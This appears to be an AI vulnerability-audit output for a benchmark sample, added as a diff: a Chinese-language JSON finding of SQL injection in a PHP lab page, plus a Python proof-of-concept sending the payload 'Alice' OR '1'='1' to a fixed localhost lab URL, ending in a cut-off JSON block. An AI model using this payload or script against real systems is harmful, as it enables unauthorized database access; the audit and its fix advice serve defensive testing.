@@ -1,0 +1,126 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011", "F01:0012", "F01:0022", "F01:0023"],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['name'] 直接读取外部输入到 $name，未见过滤或类型约束。",
+    "flow": "F01:0010 将 $name 直接拼接到单引号 SQL 字符串；F01:0011 用 $db->query($sql) 执行；F01:0012 读取结果，F01:0021-F01:0023 输出。",
+    "guard": "无效：F01:0007-F01:0011 未使用预处理绑定、未转义、无白名单；F01:0022-F01:0023 的 htmlspecialchars 仅用于 HTML 输出转义，不能阻止 SQL 结构注入。",
+    "sink": "F01:0011 的 $db->query($sql) 执行 F01:0010 拼接后的 SQL，是可达 SQL 执行点。"
+  },
+  "prerequisites": [
+    "本地入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可访问。",
+    "common/db_connect.php 成功提供已连接的 mysqli 对象 $db，且数据库用户可查询 lab_people。",
+    "lab_people 表与运行上下文一致，预置记录为 1 Alice、2 Bob、3 Carol。"
+  ],
+  "missing_context": [
+    "未提供 common/db_connect.php 的具体实现；运行上下文声明 $db 已连接，因此不猜测额外防护。",
+    "未提供数据库字符集和转义配置；即使有连接字符集，也不能改变当前直接拼接未转义输入的风险。",
+    "未提供服务器重定向和错误页细节；验证脚本固定目标并拒绝跟随重定向。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "当前仅为模型分析并给出可执行验证方案，尚未运行，未确认漏洞已实际触发。保存脚本为 s001_sql_injection_check.py 后运行 python3 s001_sql_injection_check.py。脚本只访问固定 http://127.0.0.1:4280/lab_cases/S001/index.php，不接受任意主机，不跟随重定向。普通对照请求 name=Alice，预期解析到业务记录 {(1,Alice)}；测试请求 name=Alice' OR '1'='1，预期解析到 {(1,Alice),(2,Bob),(3,Carol)}。成功条件是解析后的记录集合分别等于上述预期，而不是仅 HTTP 200 或响应中出现字符串。观察者应在浏览器中看到普通查询仅 ID 1 Alice，测试查询出现三条预置记录；数据库 lab_people 应保持 1 Alice、2 Bob、3 Carol 不变。若失败，检查入口路径、common/db_connect.php 的数据库连接、lab_people 预置数据、服务器是否重定向或 HTML 输出结构是否变化。防护建议：使用 mysqli 预处理和 bind_param 绑定 name；动态列名、排序表达式、IN 列表等 SQL 结构部分应使用白名单，不能仅用 htmlspecialchars 代替 SQL 参数化；以上为修复建议，未验证修复效果。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import http.client
+import re
+import urllib.parse
+from html.parser import HTMLParser
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S001/index.php"
+TARGET = f"http://{HOST}:{PORT}{PATH}"
+
+class RecordParser(HTMLParser):
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.in_p = False
+        self.buf = []
+        self.records = []
+
+    def handle_starttag(self, tag, attrs):
+        if tag.lower() == "p":
+            self.in_p = True
+            self.buf = []
+
+    def handle_endtag(self, tag):
+        if tag.lower() == "p" and self.in_p:
+            text = "".join(self.buf).strip()
+            m = re.match(r"^ID\s*(\d+)\s*[：:]\s*(.*)$", text)
+            if m:
+                self.records.append((int(m.group(1)), m.group(2).strip()))
+            self.in_p = False
+            self.buf = []
+
+    def handle_data(self, data):
+        if self.in_p:
+            self.buf.append(data)
+
+
+def fetch_records(name):
+    query = urllib.parse.urlencode({"name": name})
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
+    try:
+        conn.request(
+            "GET",
+            PATH + "?" + query,
+            headers={"User-Agent": "S001-audit-check"},
+        )
+        resp = conn.getresponse()
+        body = resp.read()
+        status = resp.status
+        if status in (301, 302, 303, 307, 308):
+            raise RuntimeError(f"拒绝跟随重定向：HTTP {status}")
+        if status != 200:
+            raise RuntimeError(f"非 200 响应：HTTP {status}")
+    finally:
+        conn.close()
+
+    text = body.decode("utf-8", errors="replace")
+    parser = RecordParser()
+    parser.feed(text)
+    parser.close()
+    return set(parser.records), text
+
+
+def main():
+    normal_expected = {(1, "Alice")}
+    test_expected = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
+    payload = "Alice' OR '1'='1"
+
+    normal_records, _ = fetch_records("Alice")
+    test_records, _ = fetch_records(payload)
+
+    print("目标:", TARGET)
+    print("普通请求解析记录:", sorted(normal_records))
+    print("测试请求解析记录:", sorted(test_records))
+
+    if normal_records != normal_expected:
+        raise SystemExit(
+            "普通对照失败：预期 {(1, 'Alice')}，"
+            f"实际 {normal_records}；请检查入口、数据库连接和预置数据。"
+        )
+
+    if test_records != test_expected:
+        raise SystemExit(
+            "测试请求未得到预期记录集合：预期 "
+            f"{test_expected}，实际 {test_records}；"
+            "请检查查询是否可达、服务器是否重定向、HTML 输出结构或数据库预置数据是否不同。"
+        )
+
+    print("SUCCESS: 普通请求仅返回 Alice，测试请求返回三条预置业务记录。")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+```json
+{
